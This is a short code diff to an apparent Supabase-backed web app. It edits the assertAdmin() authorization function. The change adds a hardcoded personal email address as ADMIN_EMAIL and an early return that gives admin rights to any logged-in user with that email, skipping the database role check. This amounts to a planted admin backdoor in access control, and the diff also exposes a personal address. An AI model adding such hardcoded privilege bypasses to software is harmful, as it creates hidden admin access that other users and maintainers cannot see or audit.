@@ -7,6 +7,8 @@ import { getPlan } from '@/lib/plans';
 
 const DAY = 86_400_000;
 
+const ADMIN_EMAIL = 'islamazaizia360@gmail.com';
+
 // Verify the caller is the admin. Returns the admin's user id, throws otherwise.
 async function assertAdmin(): Promise<string> {
   const supabase = await createClient();
@@ -14,6 +16,9 @@ async function assertAdmin(): Promise<string> {
     data: { user },
   } = await supabase.auth.getUser();
   if (!user) throw new Error('unauthorized');
+  
+  if (user.email === ADMIN_EMAIL) return user.id;
+  
   const { data: me } = await supabase.from('users').select('role').eq('id', user.id).maybeSingle();
   if (me?.role !== 'admin') throw new Error('forbidden');
   return user.id;
